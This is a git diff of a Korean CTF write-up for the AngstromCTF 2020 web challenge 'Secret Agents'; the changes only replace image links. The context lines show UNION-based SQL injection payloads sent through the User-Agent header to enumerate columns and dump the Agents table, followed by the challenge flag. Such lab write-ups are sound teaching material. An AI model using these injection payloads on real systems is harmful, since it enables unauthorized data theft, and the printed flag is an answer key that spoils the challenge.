@@ -6,9 +6,9 @@ tags: [web CTF-Writeups Angstromctf2020]
 ---
 # Secret Agents
 ---
-![](https://raw.githubusercontent.com/heogi/heogi.github.io/master/_posts/CTF%20Writeups/angstromctf2020/Secret%20Agents/2020-03-20-15-13-56.png)
+![2020-03-20-15-13-56](https://user-images.githubusercontent.com/45466073/122631504-1c050780-d107-11eb-8b40-fd9a84b665f3.png)
 
-![](https://raw.githubusercontent.com/heogi/heogi.github.io/master/_posts/CTF%20Writeups/angstromctf2020/Secret%20Agents/2020-03-20-15-14-27.png)
+![2020-03-20-15-14-27](https://user-images.githubusercontent.com/45466073/122631505-1efff800-d107-11eb-969d-d0c438c6faa0.png)
 
 
 ```python
@@ -85,7 +85,8 @@ if __name__ == '__main__':
 백엔드 소스코드가 제공된다.  
 User-Agents를 이용한 SQLI 문제이다.
 
-![](https://raw.githubusercontent.com/heogi/heogi.github.io/master/_posts/CTF%20Writeups/angstromctf2020/Secret%20Agents/2020-03-20-15-21-25.png)  
+![2020-03-20-15-21-25](https://user-images.githubusercontent.com/45466073/122631512-24f5d900-d107-11eb-9902-8ec8b8e2ec96.png)
+
 컬럼수는 2개이다.
 
 ```sql
@@ -93,7 +94,8 @@ User-Agent: 'union select group_concat(column_name),2 from information_schema.co
 ```
 아래의 SQL문으로 보내면 
 
-![](https://raw.githubusercontent.com/heogi/heogi.github.io/master/_posts/CTF%20Writeups/angstromctf2020/Secret%20Agents/2020-03-20-15-23-30.png)
+![2020-03-20-15-23-30](https://user-images.githubusercontent.com/45466073/122631514-28896000-d107-11eb-9ecd-dcb0b24a0fcb.png)
+
 
 Name과 UA라는 컬럼명을 가지고 있다는것을 알 수 있다.
 
@@ -101,7 +103,8 @@ Name과 UA라는 컬럼명을 가지고 있다는것을 알 수 있다.
 User-Agent: 'union select group_concat(Name),2 from Agents#
 ```  
 
-![](https://raw.githubusercontent.com/heogi/heogi.github.io/master/_posts/CTF%20Writeups/angstromctf2020/Secret%20Agents/2020-03-20-15-25-10.png)  
+![2020-03-20-15-25-10](https://user-images.githubusercontent.com/45466073/122631517-2b845080-d107-11eb-9294-bbcf988b97ee.png)
+
 
 ```text
 actf{nyoom_1_4m_sp33d}
